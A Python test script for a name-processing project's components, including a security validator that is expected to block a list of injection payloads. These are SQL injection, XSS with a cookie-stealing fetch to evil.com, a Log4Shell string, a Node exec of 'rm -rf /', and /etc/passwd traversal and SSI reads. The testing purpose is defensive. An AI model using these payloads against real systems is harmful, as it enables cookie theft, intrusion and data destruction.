from typing import List
from typing import Any
import pytest

#!/usr/bin/env python3
"""
PRACTICAL PARANOID TESTING FOR GMNAP V7

This implements thorough paranoid testing that actually works with the current codebase.
Tests every aspect with extreme thoroughness while being practical about what exists.
"""

import asyncio
import json
import os
import random
import string
import sys
import time
import unicodedata
from datetime import datetime
from pathlib import Path
from typing import Dict, List, Set, Any

# Add project root to path
project_root = Path(__file__).parent
sys.path.insert(0, str(project_root))

# Import what we can test
try:
    from src.core.security_validator import security_validator, SecurityError
    from src.core.globalid import GlobalIDGenerator
    from src.regions.manager_optimized import RegionManager
    from src.core.unicode_handler import UnicodeNormalizer
    from src.validation.schema import SchemaValidator
    from src.authorities.cache import AuthorityCache

    IMPORTS_OK = True
except ImportError as e:
    print(f"FAIL Import error: {e}")
    IMPORTS_OK = False


class PracticalParanoidTester:
    """Practical but extremely thorough tester."""

    def __init__(self):
        self.test_count = 0
        self.passed_count = 0
        self.failed_tests = []

    def test(self, name: str, condition: bool, details: str = "") -> None:
        """Record a test result."""
        self.test_count += 1
        if condition:
            self.passed_count += 1
            print(f"PASS {name}")
        else:
            self.failed_tests.append({"name": name, "details": details})
            print(f"FAIL {name}: {details}")

    def run_all_tests(self):
        """Run all paranoid tests."""
        print("🔥 PRACTICAL PARANOID TESTING 🔥")
        print("=" * 80)

        # Test each component paranoidly
        self.test_security_validator_paranoid()
        self.test_globalid_paranoid()
        self.test_region_manager_paranoid()
        self.test_unicode_handler_paranoid()
        self.test_schema_validator_paranoid()
        self.test_authority_cache_paranoid()
        self.test_korean_converter_paranoid()
        self.test_integration_paranoid()

        # Report
        self.generate_report()

    @pytest.mark.timeout(15)
    def test_security_validator_paranoid(self):
        """Paranoid testing of security validator."""
        print("\n🛡️ SECURITY VALIDATOR PARANOIA")
        print("-" * 40)

        # Basic injection attempts
        basic_injections = [
            "'; DROP TABLE users--",
            "<script>alert(1)</script>",
            "../../etc/passwd",
            "${jndi:ldap://evil.com/a}",
            "{{7*7}}",
            "%00.txt",
            "\x00admin",
            "admin\r\nSet-Cookie: admin=1",
        ]

        for injection in basic_injections:
            self.test(
                f"Block: {injection[:20]}...",
                not security_validator.is_safe(injection),
                "Should block injection",
            )

        # Unicode attacks
        unicode_attacks = [
            "admin\u200b",  # Zero-width space
            "admin\u202e",  # Right-to-left override
            "\u0430dmin",  # Cyrillic 'a'
            "admin\ufeff",  # Zero-width no-break space
            "adm\u0131n",  # Dotless i
        ]

        for attack in unicode_attacks:
            self.test(
                f"Unicode attack: {repr(attack)}",
                not security_validator.is_safe(attack)
                or security_validator._contains_dangerous_unicode(attack),
                "Should detect Unicode tricks",
            )

        # Edge cases
        self.test(
            "Empty string", security_validator.is_safe(""), "Empty should be safe"
        )

        self.test(
            "Very long string (10K chars)",
            not security_validator.is_safe("A" * 10000),
            "Should reject very long strings",
        )

        self.test(
            "Null bytes",
            not security_validator.is_safe("test\x00null"),
            "Should reject null bytes",
        )

        # Complex nested attacks
        complex_attacks = [
            "admin' AND 1=1 UNION SELECT * FROM (SELECT * FROM users)--",
            "<img src=x onerror='fetch(\"http://evil.com?c=\"+document.cookie)'>",
            "';require('child_process').exec('rm -rf /');//",
            "../../../../../../../etc/passwd%00.jpg",
            'admin<!--#exec cmd="/bin/cat /etc/passwd"-->',
        ]

        for attack in complex_attacks:
            self.test(
                f"Complex: {attack[:30]}...",
                not security_validator.is_safe(attack),
                "Should block complex attacks",
            )

        # Performance under load
        start = time.time()
        for _ in range(1000):
            security_validator.is_safe("John Smith")
        duration = time.time() - start

        self.test(
            "Performance (1000 checks)",
            duration < 1.0,
            f"Should be fast, took {duration:.3f}s",
        )

    @pytest.mark.timeout(15)
    def test_globalid_paranoid(self):
        """Paranoid testing of GlobalID generator."""
        print("\n🆔 GLOBALID GENERATOR PARANOIA")
        print("-" * 40)

        gen = GlobalIDGenerator()

        # Determinism
        id1 = gen.generate("Test Name", 2024)
        id2 = gen.generate("Test Name", 2024)
        self.test(
            "Deterministic generation", id1 == id2, "Same input should give same ID"
        )

        # Case sensitivity
        id_lower = gen.generate("john smith", 2024)
        id_upper = gen.generate("JOHN SMITH", 2024)
        id_mixed = gen.generate("John Smith", 2024)
        self.test(
            "Case normalization",
            id_lower == id_upper == id_mixed,
            "Case should be normalized",
        )

        # Unicode normalization
        composed = gen.generate("café", 2024)  # é as single char
        decomposed = gen.generate("café", 2024)  # e + combining accent
        self.test(
            "Unicode normalization",
            composed == decomposed,
            "Unicode should be normalized",
        )

        # Year variations
        years = [0, 1, 1000, 2024, 9999, -1, -1000, 999999]
        ids = []
        for year in years:
            try:
                id = gen.generate("Test", year)
                ids.append(id)
            except:
                ids.append(None)

        self.test(
            "Year handling",
            None not in ids[:5] and None in ids[5:],
            "Should handle valid years, reject invalid",
        )

        # Special characters
        special_names = [
            "O'Brien",
            "Mary-Jane",
            "José María",
            "李明",
            "Müller",
            "Владимир",
        ]

        special_ids = []
        for name in special_names:
            try:
                id = gen.generate(name, 2024)
                special_ids.append(id)
            except:
                special_ids.append(None)

        self.test(
            "Special character handling",
            None not in special_ids,
            "Should handle all special characters",
        )

        # Collision testing
        similar_names = [
            ("John Smith", "John Smyth"),
            ("李明", "李铭"),
            ("Maria Garcia", "María García"),
        ]

        for name1, name2 in similar_names:
            id1 = gen.generate(name1, 2024)
            id2 = gen.generate(name2, 2024)
            self.test(
                f"No collision: {name1} vs {name2}",
                id1 != id2,
                "Similar names should have different IDs",
            )

        # Edge cases
        edge_cases = [
            ("", 2024),  # Empty
            ("   ", 2024),  # Whitespace
            ("A", 2024),  # Single char
            ("A" * 1000, 2024),  # Very long
        ]

        for name, year in edge_cases:
            try:
                id = gen.generate(name, year)
                valid = len(name.strip()) > 0
                self.test(
                    f"Edge case: '{name[:10]}'",
                    valid,
                    "Should handle edge cases appropriately",
                )
            except:
                self.test(
                    f"Edge case: '{name[:10]}'",
                    len(name.strip()) == 0,
                    "Should reject invalid names",
                )

    @pytest.mark.timeout(15)
    def test_region_manager_paranoid(self):
        """Paranoid testing of region detection."""
        print("\n🌍 REGION MANAGER PARANOIA")
        print("-" * 40)

        manager = RegionManager()

        # Test all implemented regions
        test_cases = {
            "A1": ["John Smith", "O'Brien", "McDonald"],
            "A2": ["François Dupont", "José García", "Giovanni Rossi"],
            "B1": ["Иван Петров", "Владимир Путин"],
            "B2": ["Janusz Kowalski", "Petar Petrović"],
            "C2": ["محمد رضا", "علی اکبر"],
            "C3": ["محمد الأحمد", "عبد الله"],
            "C4": ["عبدالله آل سعود", "محمد بن سلمان"],
            "D1": ["राज कुमार", "प्रिया शर्मा"],
            "E1": ["王明", "李华", "张伟"],
            "E3": ["田中太郎", "山田花子"],
            "G1": ["João Silva", "María González"],
        }

        for expected_region, names in test_cases.items():
            for name in names:
                result = manager.detect_regions(name)
                detected = result.get("primary_region") if result else None
                self.test(
                    f"Detect {expected_region}: {name}",
                    detected == expected_region,
                    f"Got {detected}",
                )

        # Mixed scripts
        mixed_names = [
            "김 Smith",  # Korean + English
            "李 García",  # Chinese + Spanish
            "Иван Lee",  # Russian + English
        ]

        for name in mixed_names:
            result = manager.detect_regions(name)
            regions = result.get("all_regions", []) if result else []
            self.test(
                f"Mixed script: {name}",
                len(regions) > 1,
                f"Should detect multiple regions, got {regions}",
            )

        # Edge cases
        edge_names = [
            "",  # Empty
            "123",  # Numbers only
            "...",  # Punctuation only
            "A",  # Single letter
            "🎉",  # Emoji
        ]

        for name in edge_names:
            try:
                result = manager.detect_regions(name)
                self.test(
                    f"Edge case: '{name}'",
                    True,  # Should handle without crashing
                    "Should handle gracefully",
                )
            except:
                self.test(f"Edge case: '{name}'", False, "Should not crash")

        # Performance
        start = time.time()
        for _ in range(100):
            manager.detect_regions("Test Name")
        duration = time.time() - start

        self.test(
            "Detection performance (100 names)",
            duration < 5.0,
            f"Should be fast, took {duration:.3f}s",
        )

    @pytest.mark.timeout(15)
    def test_unicode_handler_paranoid(self):
        """Paranoid testing of Unicode handling."""
        print("\n🔤 UNICODE HANDLER PARANOIA")
        print("-" * 40)

        normalizer = UnicodeNormalizer()

        # Normalization forms
        test_strings = [
            "café",  # Composed
            "café",  # Decomposed
            "à façon",  # French
            "Müller",  # German
            "北京",  # Chinese
            "Москва",  # Russian
            "القاهرة",  # Arabic
        ]

        for s in test_strings:
            # Test all normalization forms
            nfc = normalizer.normalize(s, form="NFC")
            nfd = normalizer.normalize(s, form="NFD")

            self.test(
                f"Normalize: {s}",
                isinstance(nfc, str) and isinstance(nfd, str),
                "Should normalize successfully",
            )

        # Security-relevant Unicode
        security_unicode = [
            "admin\u200b",  # Zero-width space
            "test\u202e",  # Right-to-left override
            "\ufeff test",  # BOM
            "a\u0300\u0301",  # Multiple combining
        ]

        for s in security_unicode:
            normalized = normalizer.normalize(s)
            self.test(
                f"Security Unicode: {repr(s)}",
                True,  # Should handle
                "Should process security-relevant Unicode",
            )

        # Invalid Unicode
        invalid_sequences = [
            b"\xff\xfe",  # Invalid UTF-8
            b"\xc0\x80",  # Overlong encoding
            b"\xed\xa0\x80",  # Surrogate half
        ]

        for seq in invalid_sequences:
            try:
                s = seq.decode("utf-8", errors="replace")
                normalized = normalizer.normalize(s)
                self.test(
                    f"Invalid Unicode: {repr(seq)}",
                    True,
                    "Should handle invalid sequences",
                )
            except:
                self.test(
                    f"Invalid Unicode: {repr(seq)}",
                    True,
                    "Exception handling is acceptable",
                )

        # Case folding
        case_pairs = [
            ("ABC", "abc"),
            ("İstanbul", "i̇stanbul"),  # Turkish
            ("Σοφία", "σοφία"),  # Greek
            ("МОСКВА", "москва"),  # Cyrillic
        ]

        for upper, lower in case_pairs:
            folded_upper = normalizer.casefold(upper)
            folded_lower = normalizer.casefold(lower)
            self.test(
                f"Casefold: {upper}",
                folded_upper == folded_lower,
                "Should casefold correctly",
            )

    @pytest.mark.timeout(15)
    def test_schema_validator_paranoid(self):
        """Paranoid testing of schema validation."""
        print("\n📋 SCHEMA VALIDATOR PARANOIA")
        print("-" * 40)

        validator = SchemaValidator()

        # Valid entries
        valid_entries = [
            {
                "GlobalID": "GMNAP-2024-ABC123",
                "OriginalName": "Test Name",
                "NormalizedName": "test name",
                "PrimaryRegion": "A1",
                "AllRegions": ["A1"],
                "Year": 2024,
                "CreatedAt": "2024-01-01T00:00:00Z",
                "UpdatedAt": "2024-01-01T00:00:00Z",
            }
        ]

        for entry in valid_entries:
            result = validator.validate(entry)
            self.test(
                "Valid schema", result["is_valid"], "Should validate correct schema"
            )

        # Missing required fields
        required_fields = [
            "GlobalID",
            "OriginalName",
            "NormalizedName",
            "PrimaryRegion",
            "Year",
            "CreatedAt",
            "UpdatedAt",
        ]

        for field in required_fields:
            invalid = valid_entries[0].copy()
            del invalid[field]
            result = validator.validate(invalid)
            self.test(
                f"Missing {field}",
                not result["is_valid"],
                "Should reject missing required field",
            )

        # Invalid types
        type_tests = [
            ("GlobalID", 123),  # Should be string
            ("Year", "2024"),  # Should be int
            ("AllRegions", "A1"),  # Should be list
            ("CreatedAt", 123),  # Should be datetime string
        ]

        for field, value in type_tests:
            invalid = valid_entries[0].copy()
            invalid[field] = value
            result = validator.validate(invalid)
            self.test(
                f"Invalid type for {field}",
                not result["is_valid"],
                "Should reject invalid types",
            )

        # Edge cases
        edge_cases = [
            {},  # Empty
            None,  # Null
            [],  # List instead of dict
            "string",  # String instead of dict
        ]

        for case in edge_cases:
            try:
                result = validator.validate(case)
                self.test(
                    f"Edge case: {type(case).__name__}",
                    not result["is_valid"],
                    "Should reject invalid input",
                )
            except:
                self.test(
                    f"Edge case: {type(case).__name__}", True, "Exception is acceptable"
                )

    @pytest.mark.timeout(15)
    def test_authority_cache_paranoid(self):
        """Paranoid testing of authority cache."""
        print("\n💾 AUTHORITY CACHE PARANOIA")
        print("-" * 40)

        cache = AuthorityCache()

        # Basic operations
        test_id = "test_123"
        test_data = {"name": "Test", "orcid": "0000-0000-0000-0000"}

        cache.set(test_id, test_data, "orcid")
        retrieved = cache.get(test_id, "orcid")

        self.test(
            "Basic cache set/get",
            retrieved == test_data,
            "Should store and retrieve correctly",
        )

        # Cache expiration
        cache.set("expire_test", {"data": "test"}, "test", ttl_seconds=0.1)
        time.sleep(0.2)
        expired = cache.get("expire_test", "test")

        self.test("Cache expiration", expired is None, "Should expire after TTL")

        # Concurrent access
        import threading

        results = []

        def concurrent_access():
            for i in range(100):
                cache.set(f"concurrent_{i}", {"n": i}, "test")
                data = cache.get(f"concurrent_{i}", "test")
                results.append(data is not None)

        threads = [threading.Thread(target=concurrent_access) for _ in range(5)]
        for t in threads:
            t.start()
        for t in threads:
            t.join()

        self.test("Concurrent access", all(results), "Should handle concurrent access")

        # Large data
        large_data = {"data": "X" * 10000}  # 10KB
        cache.set("large", large_data, "test")
        retrieved_large = cache.get("large", "test")

        self.test(
            "Large data caching",
            retrieved_large == large_data,
            "Should handle large data",
        )

        # Invalid inputs
        invalid_tests = [
            (None, {}, "test"),  # None key
            ("test", None, "test"),  # None data
            ("test", {}, None),  # None source
        ]

        for key, data, source in invalid_tests:
            try:
                cache.set(key, data, source)
                result = cache.get(key, source)
                self.test(
                    f"Invalid input: {key}, {data}, {source}",
                    True,
                    "Should handle gracefully",
                )
            except:
                self.test(
                    f"Invalid input: {key}, {data}, {source}",
                    True,
                    "Exception is acceptable",
                )

    @pytest.mark.timeout(15)
    def test_korean_converter_paranoid(self):
        """Paranoid testing of Korean converter."""
        print("\n🇰🇷 KOREAN CONVERTER PARANOIA")
        print("-" * 40)

        # Try to import Korean converter
        try:
            os.chdir(
                Path(__file__).parent / "src" / "regions" / "e_groups" / "e4_korea"
            )
            sys.path.insert(0, os.getcwd())

            # # # from converter_v7 import KoreanConverterV7
            # # # from converter import eng2kor, kor2eng

            converter = KoreanConverterV7()

            # Basic round-trip tests
            korean_names = ["김철수", "이미나", "박영희", "최동훈", "정은지"]

            for korean_name in korean_names:
                romanized = converter.romanize(korean_name)
                back_to_korean = converter.koreanize(romanized)
                accuracy = converter.round_trip_accuracy(korean_name, is_korean=True)

                self.test(
                    f"Round-trip: {korean_name}",
                    accuracy >= 0.97,
                    f"Got {accuracy:.3f} accuracy",
                )

            # Edge cases
            edge_cases = [
                "",  # Empty
                "김",  # Single syllable
                "김김김김김",  # Repeated
                "김 철수",  # With space
                "김철수123",  # With numbers
            ]

            for case in edge_cases:
                try:
                    romanized = converter.romanize(case)
                    self.test(f"Edge case: '{case}'", True, "Should handle edge case")
                except:
                    self.test(
                        f"Edge case: '{case}'",
                        len(case.strip()) == 0,
                        "Should reject empty",
                    )

            # Multiple valid romanizations
            romanizations = ["kim chul soo", "kim cheol su", "kim chul-soo"]

            for rom in romanizations:
                korean = converter.koreanize(rom)
                self.test(
                    f"Romanization variant: {rom}", korean == "김철수", f"Got {korean}"
                )

            # Performance
            start = time.time()
            for _ in range(100):
                converter.romanize("김철수")
            duration = time.time() - start

            self.test(
                "Conversion performance (100 names)",
                duration < 1.0,
                f"Took {duration:.3f}s",
            )

        except ImportError:
            self.test(
                "Korean converter availability",
                False,
                "Could not import Korean converter",
            )
        except Exception as e:
            self.test("Korean converter testing", False, f"Error: {e}")
        finally:
            # Restore directory
            os.chdir(project_root)

    @pytest.mark.timeout(15)
    def test_integration_paranoid(self):
        """Paranoid integration testing."""
        print("\n🔗 INTEGRATION PARANOIA")
        print("-" * 40)

        # Test component interaction
        gen = GlobalIDGenerator()
        manager = RegionManager()
        validator = SchemaValidator()

        # Process a name through multiple components
        test_names = [
            ("John Smith", 2024, "A1"),
            ("李明", 2024, "E1"),
            ("محمد أحمد", 2024, "C3"),
            ("Владимир Петров", 2024, "B1"),
        ]

        for name, year, expected_region in test_names:
            # Detect region
            region_result = manager.detect_regions(name)
            detected_region = (
                region_result.get("primary_region") if region_result else None
            )

            # Generate ID
            global_id = gen.generate(name, year)

            # Create entry
            entry = {
                "GlobalID": global_id,
                "OriginalName": name,
                "NormalizedName": name.lower(),
                "PrimaryRegion": detected_region or "UNKNOWN",
                "AllRegions": (
                    region_result.get("all_regions", []) if region_result else []
                ),
                "Year": year,
                "CreatedAt": datetime.utcnow().isoformat() + "Z",
                "UpdatedAt": datetime.utcnow().isoformat() + "Z",
            }

            # Validate
            validation = validator.validate(entry)

            self.test(
                f"Integration: {name}",
                validation["is_valid"] and detected_region == expected_region,
                f"Region: {detected_region}, Valid: {validation['is_valid']}",
            )

        # Test error propagation
        bad_inputs = [
            (None, 2024),  # None name
            ("Test", -1),  # Invalid year
            ("", 2024),  # Empty name
        ]

        for name, year in bad_inputs:
            try:
                if name:
                    region_result = manager.detect_regions(name)
                global_id = gen.generate(name or "", year)
                self.test(
                    f"Error handling: {name}, {year}", False, "Should have failed"
                )
            except:
                self.test(
                    f"Error handling: {name}, {year}",
                    True,
                    "Correctly raised exception",
                )

    def generate_report(self):
        """Generate the paranoid test report."""
        print("\n" + "=" * 80)
        print("📊 PARANOID TEST REPORT")
        print("=" * 80)

        print(f"\nTotal Tests: {self.test_count}")
        print(f"Passed: {self.passed_count}")
        print(f"Failed: {len(self.failed_tests)}")
        print(f"Success Rate: {(self.passed_count / self.test_count * 100):.1f}%")

        if self.failed_tests:
            print("\nFAIL FAILED TESTS:")
            for test in self.failed_tests[:10]:  # Show first 10
                print(f"  - {test['name']}: {test['details']}")
            if len(self.failed_tests) > 10:
                print(f"  ... and {len(self.failed_tests) - 10} more")

        # Assessment
        print("\n🎯 PARANOIA ASSESSMENT:")

        success_rate = self.passed_count / self.test_count

        if success_rate == 1.0:
            print("PASS PERFECT PARANOIA!")
            print("   All tests passed. System is extremely robust.")
        elif success_rate >= 0.95:
            print("PASS EXCELLENT PARANOIA (>=95%)")
            print("   System is production-ready with minor issues.")
        elif success_rate >= 0.90:
            print("WARN GOOD PARANOIA (>=90%)")
            print("   System is solid but needs some improvements.")
        elif success_rate >= 0.80:
            print("WARN MODERATE PARANOIA (>=80%)")
            print("   System has significant gaps to address.")
        else:
            print("FAIL INSUFFICIENT PARANOIA (<80%)")
            print("   System needs major work before production.")

        # Component breakdown
        print("\n📈 COMPONENT BREAKDOWN:")
        components = {
            "Security": [
                t for t in self.failed_tests if "security" in t["name"].lower()
            ],
            "GlobalID": [
                t for t in self.failed_tests if "globalid" in t["name"].lower()
            ],
            "Region": [t for t in self.failed_tests if "region" in t["name"].lower()],
            "Unicode": [t for t in self.failed_tests if "unicode" in t["name"].lower()],
            "Schema": [t for t in self.failed_tests if "schema" in t["name"].lower()],
            "Cache": [t for t in self.failed_tests if "cache" in t["name"].lower()],
            "Korean": [t for t in self.failed_tests if "korean" in t["name"].lower()],
        }

        for component, failures in components.items():
            total = len(
                [t for t in self.failed_tests if component.lower() in t["name"].lower()]
            )
            if total > 0:
                print(f"  {component}: {len(failures)} failures")

        print("\n" + "=" * 80)


def main():
    """Run practical paranoid testing."""
    if not IMPORTS_OK:
        print("FAIL Cannot run tests - imports failed")
        return

    tester = PracticalParanoidTester()
    tester.run_all_tests()


if __name__ == "__main__":
    main()
